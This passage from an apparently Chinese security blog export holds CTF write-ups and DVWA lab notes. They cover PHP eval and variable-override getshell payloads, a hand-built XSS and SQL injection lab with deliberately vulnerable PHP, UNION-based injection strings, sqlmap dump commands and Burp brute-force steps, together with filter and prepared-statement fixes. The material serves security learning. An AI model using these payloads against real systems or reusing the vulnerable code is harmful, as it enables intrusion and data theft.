&#125; &#125; 这段是将设置var开头，后面带1到2个数字变量的值，类似于var1=xxx或者var12=xxx 这样的 由于变量覆盖的环节限制了单双引号的输入，所以这里的解法为利用php复杂变量getshell 什么是php复杂变量getshell PHP复杂变量 {}不能被转移，其包裹的部分可当作变量就是${phpinfo()}和{${phpinfo()}}是一样的，花括号{}只是用于区别变量边界的标识符 payload: ?source=1&amp;adminPassword=c4ca4238a0b923820dcc509a6f75849b&amp;password=1&amp;verif=0e1290633704&amp;var1=&#123;$_GET[1]&#125;&amp;var3=$&#123;$var1()&#125;&amp;1=phpinfo //var1=&#123;phpinfo&#125; //var3=$&#123;$var1&#125;=$&#123;phpinfo&#125; flag藏在phpinfo中，ctrl+f搜素flag即可 babyeval&lt;?php // flag在flag.php if(isset($_GET['a']))&#123; if(preg_match('/\\(.*\\)/', $_GET['a'])) die('hacker!!!'); ob_start(function($data)&#123; if (strpos($data, 'flag') !== false) return 'ByeBye hacker'; return false; &#125;); eval($_GET['a']); &#125; else &#123; highlight_file(__FILE__); &#125; ?&gt; 看下代码 1.get 提交一个参数a 2.正则过滤，a中不能包含（） 3.function($data)，这个函数过滤了flag字段，所以行业不能包含flag 4.绕过上面两个后就可以执行eval() 可以使用echo配合``绕过上面的检测 echo `base64 f*`; 但是一般想到的应该是 system(\"cat /flag.php\"); 可以利用%0a绕过，%0a对应的ascii码为换行符，并且为base64格式显示，不然会被拦截 a=system(\"%0acat /f*|%20base64\");","tags":[{"name":"ssrf","slug":"ssrf","permalink":"https://sunzhengyu99.github.io/tags/ssrf/"}]},{"title":"xss和sql注入简单环境的搭建","date":"2020-11-15T08:14:50.000Z","path":"2020/11/15/xss-sql/","text":"xss和sql注入简单环境的搭建以下环境都是基于PHP study搭建的，版本为 php 5.5.38+Apache 参考了dvwa的漏洞源码与攻击方式。 xss漏洞的搭建1.网页源码&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt; &lt;title&gt;xss&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;center&gt; &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt; &lt;h6&gt;please input your name!&lt;&#x2F;h6&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;&quot; &#x2F;&gt;&lt;br &#x2F;&gt; &lt;input type&#x3D;&#39;submit&#39; value&#x3D;&quot;submit&quot; &#x2F;&gt; &lt;&#x2F;form&gt; &lt;?php function SafeFilter (&amp;$arr) &#123; $ra&#x3D;Array(&#39;&#x2F;([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])&#x2F;&#39;,&#39;&#x2F;script&#x2F;&#39;,&#39;&#x2F;javascript&#x2F;&#39;,&#39;&#x2F;vbscript&#x2F;&#39;,&#39;&#x2F;expression&#x2F;&#39;,&#39;&#x2F;applet&#x2F;&#39; ,&#39;&#x2F;meta&#x2F;&#39;,&#39;&#x2F;xml&#x2F;&#39;,&#39;&#x2F;blink&#x2F;&#39;,&#39;&#x2F;link&#x2F;&#39;,&#39;&#x2F;style&#x2F;&#39;,&#39;&#x2F;embed&#x2F;&#39;,&#39;&#x2F;object&#x2F;&#39;,&#39;&#x2F;frame&#x2F;&#39;,&#39;&#x2F;layer&#x2F;&#39;,&#39;&#x2F;title&#x2F;&#39;,&#39;&#x2F;bgsound&#x2F;&#39; ,&#39;&#x2F;base&#x2F;&#39;,&#39;&#x2F;onload&#x2F;&#39;,&#39;&#x2F;onunload&#x2F;&#39;,&#39;&#x2F;onchange&#x2F;&#39;,&#39;&#x2F;onsubmit&#x2F;&#39;,&#39;&#x2F;onreset&#x2F;&#39;,&#39;&#x2F;onselect&#x2F;&#39;,&#39;&#x2F;onblur&#x2F;&#39;,&#39;&#x2F;onfocus&#x2F;&#39;, &#39;&#x2F;onabort&#x2F;&#39;,&#39;&#x2F;onkeydown&#x2F;&#39;,&#39;&#x2F;onkeypress&#x2F;&#39;,&#39;&#x2F;onkeyup&#x2F;&#39;,&#39;&#x2F;onclick&#x2F;&#39;,&#39;&#x2F;ondblclick&#x2F;&#39;,&#39;&#x2F;onmousedown&#x2F;&#39;,&#39;&#x2F;onmousemove&#x2F;&#39; ,&#39;&#x2F;onmouseout&#x2F;&#39;,&#39;&#x2F;onmouseover&#x2F;&#39;,&#39;&#x2F;onmouseup&#x2F;&#39;,&#39;&#x2F;onunload&#x2F;&#39;); if (is_array($arr)) &#123; foreach ($arr as $key &#x3D;&gt; $value) &#123; if (!is_array($value)) &#123; if (!get_magic_quotes_gpc()) &#x2F;&#x2F;不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。 &#123; $value &#x3D; addslashes($value); &#x2F;&#x2F;给单引号（&#39;）、双引号（&quot;）、反斜线（\\）与 NUL（NULL 字符） 加上反斜线转义 &#125; $value &#x3D; preg_replace($ra,&#39;&#39;,$value); &#x2F;&#x2F;删除非打印字符，粗暴式过滤xss可疑字符串 $arr[$key] &#x3D; htmlentities(strip_tags($value)); &#x2F;&#x2F;去除 HTML 和 PHP 标记并转换为 HTML 实体 &#125; else &#123; SafeFilter($arr[$key]); &#125; &#125; &#125; &#125; &#x2F;&#x2F;php防注入和XSS攻击通用过滤 $_POST &amp;&amp; SafeFilter($_POST); if (isset($_POST[&#39;username&#39;])) &#123; $s&#x3D;$_POST[&#39;username&#39;]; echo $s; &#125; ?&gt; &lt;&#x2F;center&gt; &lt;&#x2F;script&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; 网页源码十分简单，就是用户输入所要查询的username，之后将其输入的内容打印出来。 起初并没有对用户的输入进行处理，直接执行了echo，造成了xss漏洞的出现。 2.攻击效果在输入栏中输入以下 &lt;script&gt;alert(\"xss\")&lt;/script&gt; &lt;img src=1 onerror=alert(/xsss/)&gt; 3.漏洞修复修复漏洞只需要对用户的输入内容进行检测和过滤，并将一些可能造成攻击的特殊字符进行转义，让其不起到原本的作用。 过滤函数如下 function SafeFilter (&amp;$arr) &#123; $ra=Array('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/' ,'/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/' ,'/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/', '/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/' ,'/onmouseout/','/onmouseover/','/onmouseup/','/onunload/'); if (is_array($arr)) &#123; foreach ($arr as $key =&gt; $value) //循环语句，挨个检测 &#123; if (!is_array($value)) &#123; if (!get_magic_quotes_gpc()) &#123; $value = addslashes($value); //给单引号（'）、双引号（\"）、反斜线（\\）与 NUL（NULL 字符） 加上反斜线转义 &#125; $value = preg_replace($ra,'',$value); //删除非打印字符 $arr[$key] = htmlentities(strip_tags($value)); //去除 HTML 和 PHP 标记并转换为 HTML 实体 &#125; else &#123; SafeFilter($arr[$key]); &#125; &#125; &#125; &#125; 各个函数功能如下： magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误 在magic_quotes_gpc=On的情况下，如果输入的数据有 单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）等字符都会被加上反斜线。 addslashes函数 htmlentities() 函数把字符转换为 HTML 实体。 sql注入环境搭建与攻击网页源码，最常见的登录页面，其中没有对用户名和密码进行过滤，就将其带入sql语句中查询造成了sql注入的出现。 login.php源码 &lt;!DOCTYPE html&gt; &lt;html &gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt; &lt;title&gt;Sqli&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;body&gt; &lt;div class&#x3D;&quot;limiter&quot;&gt; &lt;div class&#x3D;&quot;container-login100&quot;&gt; &lt;div class&#x3D;&quot;wrap-login100 p-b-160 p-t-50&quot;&gt; &lt;form class&#x3D;&quot;login100-form validate-form&quot; action&#x3D;&quot;check.php&quot; method&#x3D;&quot;post&quot;&gt; &lt;span class&#x3D;&quot;login100-form-title p-b-43&quot;&gt; Account Login &lt;&#x2F;span&gt; &lt;div class&#x3D;&quot;wrap-input100 rs1 validate-input&quot; data-validate&#x3D;&quot;Username is required&quot;&gt; &lt;input class&#x3D;&quot;input100&quot; type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt; &lt;span class&#x3D;&quot;label-input100&quot;&gt;Username&lt;&#x2F;span&gt; &lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;wrap-input100 rs2 validate-input&quot; data-validate&#x3D;&quot;Password is required&quot;&gt; &lt;input class&#x3D;&quot;input100&quot; type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt; &lt;span class&#x3D;&quot;label-input100&quot;&gt;Password&lt;&#x2F;span&gt; &lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;container-login100-form-btn&quot;&gt; &lt;button type&#x3D;&quot;submit&quot; class&#x3D;&quot;login100-form-btn&quot;&gt; Sign in &lt;&#x2F;button&gt; &lt;&#x2F;div&gt; &lt;&#x2F;form&gt; &lt;&#x2F;div&gt; &lt;&#x2F;a&gt; &lt;&#x2F;div&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; check.php源码 &lt;?php $pwd=$_POST['password']; $uname=$_POST['username']; $mysqli = new mysqli('localhost','root','root','test'); // 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名 if(mysqli_connect_errno())&#123; printf(\"fail:%s&lt;br&gt;\",mysqli_connect_error()); exit(); &#125; $result = $mysqli-&gt;query(\"select * from users where username='$uname' and password='$pwd'\"); echo \"&lt;TABLE border=1,width=400&gt;\"; echo \"&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;\"; if($row=mysqli_fetch_row($result)) &#123; printf (\"&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;\",$row[1],$row[2]); echo \"&lt;br&gt;\"; echo \"login success\"; &#125; else &#123; echo \"username or password error\"; &#125; // echo \"&lt;/TABLE&gt;\"; // echo \"&lt;/div&gt;\"; $mysqli-&gt;close(); $result-&gt;close(); ?&gt; 逻辑很简单，在login.php页面提交用户名和密码，将username和password发送到check.php页面连接数据库检查用户是否合法，用户名和密码都正确则，打印出用户名和密码。 在数据库建立了一张users和flag表，便于注入。 表中的内容如下 1.漏洞利用直接使用万能密码登陆 username:1' or 1=1 # username:111 结果打印出了第一个用户的用户名和密码 这个结果也说名了是字符型注入，接下来利用改注入点获取flag 判断表有几列1' order by 3# 页面显示正常，而改为4的时候网页出现报错，说明了只有三列 1' order by 4# 判断显示位' union select 1,database(),3# 说明有两个显示位，选择其中一个位置进行注入即可。 获取表名' union select 1,group_concat(table_name),3 from information_schema.TABLES where TABLE_SCHEMA=database()# 获取列名' union select 1,group_concat(COLUMN_name),3 from information_schema.COLUMNS where TABLE_NAME='flag'# （fl4g是dvwa实验中建立没有删除，所以也显示出来了） 获取flag' union select 1,group_concat(flag),3 from flag# 2.漏洞防御方法一：最简单的方法对用户名和密码的长度限制，一般用户名的长度不超过十五个字符，而密码的长度一般不超过16个字符长度，所以对用户输入限制长度是最有效的方法之一。因为一般的注入语句都是超过十六个字符的，想要在十六个字符之内构造出有效的注入语句是一件很难的事情。 代码实现 &lt;?php $pwd=$_POST['password']; $uname=$_POST['username']; $mysqli = new mysqli('localhost','root','root','test'); // 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名 if(mysqli_connect_errno())&#123; printf(\"fail:%s&lt;br&gt;\",mysqli_connect_error()); exit(); &#125; $result = $mysqli-&gt;query(\"select * from users where username='$uname' and password='$pwd'\"); echo \"&lt;TABLE border=1,width=400&gt;\"; echo \"&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;\"; if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15) &#123; echo \"It is too long.\"; &#125; else if($row=mysqli_fetch_row($result)) &#123; printf (\"&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;\",$row[1],$row[2]); echo \"&lt;br&gt;\"; echo \"login success.\"; &#125; else &#123; echo \"username or password error.\"; &#125; // echo \"&lt;/TABLE&gt;\"; // echo \"&lt;/div&gt;\"; $mysqli-&gt;close(); $result-&gt;close(); ?&gt; 方法二对用户输入进行检测和过滤，将其输入的可能产生恶意行为的代码删除或者转义，使其失去原来的功能。 代码实现 &lt;?php $pwd=$_POST['password']; $uname=$_POST['username']; //echo \"select * from admin where passward='$pwd' and name='$uname'&lt;br/&gt;\"; //echo \"&lt;hr&gt;\"; function inject_check($Sql_Str) &#123;//自动过滤Sql的注入语句。 $check=preg_match('/select|from|where|if|database|order|insert|update|or|group_concat|\\'|\\\\*|\\*|\\.\\.\\/|\\.\\/|union|and|ascii|substring|sleep/i',$Sql_Str); if ($check) &#123; echo '&lt;script language=\"JavaScript\"&gt;alert(\"hacker\");&lt;/script&gt;'; exit(); &#125;else&#123; return $Sql_Str; &#125; &#125; $pwd=inject_check($pwd); $uname = inject_check($uname); $mysqli = new mysqli('localhost','root','root','test'); // 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名 if(mysqli_connect_errno())&#123; printf(\"fail:%s&lt;br&gt;\",mysqli_connect_error()); exit(); &#125; $result = $mysqli-&gt;query(\"select * from users where username='$uname' and password='$pwd'\"); echo \"&lt;TABLE border=1,width=400&gt;\"; echo \"&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;\"; // if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15) // &#123; // echo \"It is too long.\"; // &#125; // else if($row=mysqli_fetch_row($result)) &#123; printf (\"&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;\",$row[1],$row[2]); echo \"&lt;br&gt;\"; echo \"login success.\"; &#125; else &#123; echo \"username or password error.\"; &#125; // echo \"&lt;/TABLE&gt;\"; // echo \"&lt;/div&gt;\"; $mysqli-&gt;close(); $result-&gt;close(); ?&gt; 过滤函数如下，其中将一般注入需要用到的函数和符号都过滤了。 function inject_check($Sql_Str) &#123;//自动过滤Sql的注入语句。 $check=preg_match('/select|from|where|if|database|order|insert|update|or|group_concat|\\'|\\\\*|\\*|\\.\\.\\/|\\.\\/|union|and|ascii|substring|sleep/i',$Sql_Str); if ($check) &#123; echo '&lt;script language=\"JavaScript\"&gt;alert(\"hacker\");&lt;/script&gt;'; exit(); &#125;else&#123; return $Sql_Str; &#125; &#125; 方法三使用预编译语句 代码如下 &lt;?php $pwd=$_POST['password']; $uname=$_POST['username']; // function inject_check($Sql_Str) &#123;//自动过滤Sql的注入语句。 // $check=preg_match('/select|from|where|if|database|order|insert|update|or|group_concat|\\'|\\\\*|\\*|\\.\\.\\/|\\.\\/|union|and|ascii|substring|sleep/i',$Sql_Str); // if ($check) &#123; // echo '&lt;script language=\"JavaScript\"&gt;alert(\"hacker\");&lt;/script&gt;'; // exit(); // &#125;else&#123; // return $Sql_Str; // &#125; // &#125; // $pwd=inject_check($pwd); // $uname = inject_check($uname); // $mysqli = new mysqli('localhost','root','root','test'); // 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名 if(mysqli_connect_errno())&#123; printf(\"fail:%s&lt;br&gt;\",mysqli_connect_error()); exit(); &#125; echo \"&lt;TABLE border=1,width=400&gt;\"; echo \"&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;\"; $result = $mysqli-&gt;prepare(\"select * from users where username=? and password=?\"); $result-&gt;bind_param('ss',$uname,$pwd); $result-&gt;execute(); $result-&gt;store_result(); $result-&gt;bind_result($id,$un,$pd); //将查询到的变量绑定到三个自定义的变量中，输出时直接输出这三个变量即可。 if($result-&gt;fetch()) &#123; printf(\"&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;\",$un,$pd); &#125; else &#123; echo \"username or password error.\"; &#125; // if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15) // &#123; // echo \"It is too long.\"; // &#125; echo \"&lt;/TABLE&gt;\"; echo \"&lt;/div&gt;\"; $result-&gt;close(); $mysqli-&gt;close(); ?&gt; 应用预编译语句后，再次输入注入语句后就不再起到注入作用，只是将其当成正常的查询过程，返回相应的结果。","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"xss","slug":"xss","permalink":"https://sunzhengyu99.github.io/tags/xss/"}]},{"title":"网安作业2","date":"2020-11-12T11:09:43.000Z","path":"2020/11/12/网安作业2/","text":"DVWA实验一下都是基于low,mid,high级别的实验，为了方便叙述，提前在数据库中建了一个flag表 Brute Force使用工具 ：bp 使用材料：密码字典 bp的四种爆破攻击类型第一种：Sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。 第二种：Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中 第三种：Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量 第四种：Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。 low1.抓包–&gt;ctrl+I –&gt;标记要爆破的参数，这里直接爆破password 2.选择要加载的密码字典，可以使用自己准备的密码字典，也可以使用bp自带的密码字典，但是最重要的是要包含正确达到密码 3.开始爆破 ，根据响应包的长度筛选出正确密码的响应包，这里只有当密码为password的时候响应包的长度为4743,所以password就是争取密码。 medium&lt;?php if( isset( $_GET[ 'Login' ] ) ) &#123; // Sanitise username input $user = $_GET[ 'username' ]; $user = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $user ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Sanitise password input $pass = $_GET[ 'password' ]; $pass = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass = md5( $pass ); // Check the database $query = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[\"avatar\"]; // Login successful echo \"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;\"; echo \"&lt;img src=\\\"&#123;$avatar&#125;\\\" /&gt;\"; &#125; else &#123; // Login failed sleep( 2 ); echo \"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;\"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); &#125; ?&gt; 与low级别相比较，只是增加了回显的时间，所以还是可以使用low级别的方法直接爆破，不过花费的时间相对会长一点。 1.火狐浏览器打开代理抓包后发到爆破模块，添加爆破的变量。 2.加载密码字典进行爆破。 3.根据响应包的长度确定正确密码。 high&lt;?php if( isset( $_GET[ 'Login' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Sanitise username input $user = $_GET[ 'username' ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $user ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Sanitise password input $pass = $_GET[ 'password' ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass = md5( $pass ); // Check database $query = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[\"avatar\"]; // Login successful echo \"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;\"; echo \"&lt;img src=\\\"&#123;$avatar&#125;\\\" /&gt;\"; &#125; else &#123; // Login failed sleep( rand( 0, 3 ) ); echo \"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;\"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 审计代码后可以发现使用了随机token机制来防止CSRF，从而在一定程度上防止了重放攻击，增加了爆破难度，但是任然可以使用bp的爆破模块 1.抓包，发包到爆破模块并添加参数，这次需要添加两个参数，设置 password和user_token为变量 2.攻击类型选择pitchfork，意思是草叉模式（Pitchfork ）——它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），遍历所有的Payload。举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起两次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为B和D。 3.设置参数，在option选项卡中将攻击线程thread设置为1，因为Recursive_Grep模式不支持多线程攻击，然后选择Grep-Extract，意思是用于提取响应消息中的有用信息，点击Add，如下图进行设置，最后将Redirections设置为Always 4.设置payload，第一个参数是密码与之前两次一样，加载密码字典即可，第二token参数选择Recursive grep，然后将options中的token作为第一次请求的初始值。 5.start attack,还是根据响应包长度的不同找到包含真正密码的请求包，获取正确密码。 SQL Injectionlow&lt;?php if( isset( $_SESSION [ 'id' ] ) ) &#123; // Get input $id = $_SESSION[ 'id' ]; // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[\"first_name\"]; $last = $row[\"last_name\"]; // Feedback for end user echo \"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;\"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); &#125; ?&gt; SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;注入点就在这句代码中 手工注入1.判断注入类型1 or 1=1 # 1' or 1=1 # 可知是字符型注入 2.判断多少字段数1' order by 1,2,3 # 报错 1' order by 1,2 # 显示正常，说明只有2个字段 3.确认显示顺序 两个位置都可以使用 4.union查询1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# 1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' # 1' union select 1,group_concat(fl4g) from flag # sqlmap注入python2 sqlmap.py -u \"http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#\" --cookie=\"security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1\" --batch --dbs python2 sqlmap.py -u \"http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#\" --cookie=\"security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1\" --batch -D dvwa -T flag --columns python2 sqlmap.py -u \"http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#\" --cookie=\"security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1\" --batch -D dvwa -T flag -C fl4g --dump medium与low级别相比较，这里的id值不需要用户输入，只需要选择，但是可以抓包修改id的内容 手工注入经过测试是数字型注入，很简单的判断就不截图了 1.判断列数id=1 order by 1,2#&amp;Submit=Submit 此时页面正常 id=1 order by 1,2,3#&amp;Submit=Submit 此时页面报错 Unknown column &#39;3&#39; in &#39;order clause&#39; 所以可知为两列，之后的操作与low级别的一样 2.union查询爆数据库名 id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;Submit=Submit 爆列名 id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x666c6167 #&amp;Submit=Submit 读取flag id=-1 union select 1,group_concat(fl4g) from flag #&amp;Submit=Submit 这里读取列名的时候需要注意使用列名的十六进制，不然就会报错，应该是 &#39;被 \\转义了，可以使用十六进制绕过 分析源码 &lt;?php if( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $id = $_POST[ 'id' ]; $id = mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $id); $query = \"SELECT first_name, last_name FROM users WHERE user_id = $id;\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query) or die( '&lt;pre&gt;' . mysqli_error($GLOBALS[\"___mysqli_ston\"]) . '&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Display values $first = $row[\"first_name\"]; $last = $row[\"last_name\"]; // Feedback for end user echo \"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;\"; &#125; &#125; // This is used later on in the index.php page // Setting it here so we can close the database connection in here like in the rest of the source scripts $query = \"SELECT COUNT(*) FROM users;\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); $number_of_rows = mysqli_fetch_row( $result )[0]; mysqli_close($GLOBALS[\"___mysqli_ston\"]); ?&gt; mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符。 所以导致了单引号被转义的结果 sqlmap注入因为是post注入，所以需要抓取数据包保存下来。 如图，可以将其保存在sqlmap.py的路径下 注入过程python2 .\\sqlmap.py -r .\\a.txt --batch --dbs python2 .\\sqlmap.py -r .\\a.txt --batch -D dvwa --tables python2 .\\sqlmap.py -r .\\a.txt --batch -D dvwa -T flag --columns python2 .\\sqlmap.py -r .\\a.txt --batch -D dvwa -T flag -C fl4g --dump high这次用户输入与回显不在同一个页面，这只要是为了防止sqlmap这种自动化注入工具的攻击 注入直接使用low级别的payload： 1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# 1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' # 1' union select 1,group_concat(fl4g) from flag # 源码分析 &lt;?php if( isset( $_SESSION [ 'id' ] ) ) &#123; // Get input $id = $_SESSION[ 'id' ]; // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[\"first_name\"]; $last = $row[\"last_name\"]; // Feedback for end user echo \"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br 